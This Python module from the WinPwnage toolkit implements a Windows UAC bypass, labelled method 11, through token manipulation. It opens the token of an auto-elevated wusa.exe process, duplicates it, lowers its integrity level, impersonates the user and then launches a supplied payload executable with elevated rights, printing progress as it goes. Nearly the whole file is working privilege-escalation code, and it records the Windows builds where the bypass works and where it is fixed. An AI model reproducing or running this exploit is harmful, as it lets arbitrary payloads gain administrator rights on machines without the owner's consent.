from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *

#Creds to: https://gist.github.com/highsenburger69/b86eb4db41e651a6518fd61d88aa9f91

uacMethod11_info = {
	"Description": "UAC bypass using token manipulation",
	"Method": "Token manipulation",
	"Id": "11",
	"Type": "UAC bypass",
	"Fixed In": "17686" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "uacMethod11",
	"Function Payload": True,
}

def uacMethod11(payload):
	if information().admin():
		print_error("Unable to proceed, we are already elevated")
		return False
		
	if payloads().exe(payload):
		print_info("Launching elevated process")
		ShellExecute = ShellExecuteInfoW()
		ShellExecute.cbSize = sizeof(ShellExecute)
		ShellExecute.fMask = 0x00000040 
		ShellExecute.lpFile = u"wusa.exe"
		ShellExecute.nShow = 0

		if ShellExecuteEx(byref(ShellExecute)) == 0:
			print_error("Error while triggering elevated binary using ShellExecuteEx: {}".format(GetLastError()))
		else:
			print_success("Successfully started process")

		print_info("Grabbing token")
		hToken = HANDLE(c_void_p(-1).value)
		if NtOpenProcessToken(ShellExecute.hProcess, 0x02000000, byref(hToken)) == STATUS_UNSUCCESSFUL:
			print_error("Error while opening target process token using NtOpenProcessToken: {}".format(GetLastError()))

		TerminateProcess(ShellExecute.hProcess, -1)
		WaitForSingleObject(ShellExecute.hProcess, -1)

		print_info("Opening token of elevated process")
		newhToken = HANDLE(c_void_p(-1).value)
		SECURITY_ATTRIBUTE = SECURITY_ATTRIBUTES()

		if DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, byref(SECURITY_ATTRIBUTE),                     
										SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, 
										TOKEN_TYPE.TokenPrimary, byref(newhToken))  == STATUS_UNSUCCESSFUL:
			print_error("Error while duplicating Primary token using DuplicateTokenEx: {}".format(GetLastError()))

		print_info("Duplicating primary token")
		mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
		pIntegritySid = LPVOID()

		if RtlAllocateAndInitializeSid(byref(mlAuthority), 1, IntegrityLevel.SECURITY_MANDATORY_MEDIUM_RID,
										0, 0, 0, 0, 0, 0, 0, byref(pIntegritySid)) == STATUS_UNSUCCESSFUL:
			print_error("Error while initializing Medium IL SID using RtlAllocateAndInitializeSid: {}".format(GetLastError()))

		print_info("Initializing a SID for Medium Integrity level")
		SID_AND_ATTRIBUTE = SID_AND_ATTRIBUTES()
		SID_AND_ATTRIBUTE.Sid = pIntegritySid
		SID_AND_ATTRIBUTE.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
		TOKEN_MANDATORY = TOKEN_MANDATORY_LABEL()
		TOKEN_MANDATORY.Label = SID_AND_ATTRIBUTE

		if NtSetInformationToken(newhToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
									byref(TOKEN_MANDATORY), sizeof(TOKEN_MANDATORY)) == STATUS_UNSUCCESSFUL:
			print_error("Error while setting medium IL token using NtSetInformationToken: {}".format(GetLastError()))

		print_info("Now we are lowering the token's integrity level from High to Medium")
		hLuaToken = HANDLE(c_void_p(-1).value)
		if NtFilterToken(newhToken, 0x4, None, None, None, byref(hLuaToken)) == STATUS_UNSUCCESSFUL:
			print_error("Error while creating a restricted token using NtFilterToken: {}".format(GetLastError()))
			
		print_info("Creating restricted token")
		ImpersonateLoggedOnUser(hLuaToken)

		print_info("Impersonating logged on user")
		lpStartupInfo = STARTUPINFO()
		lpStartupInfo.cb = sizeof(lpStartupInfo)
		lpProcessInformation = PROCESS_INFORMATION()
		lpStartupInfo.dwFlags = 0x00000001
		lpStartupInfo.wShowWindow = 5
		lpApplicationName = payloads().exe(payload)[1]

		if CreateProcessWithLogonW(u"aaa", u"bbb", u"ccc",0x00000002, lpApplicationName, None,
									0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
			print_error("Error while triggering admin payload using CreateProcessWithLogonW: {}".format(GetLastError()))
		else:
			print_success("Successfully executed payload with PID: {}".format(lpProcessInformation.dwProcessId))
	else:
		print_error("Cannot proceed, invalid payload")
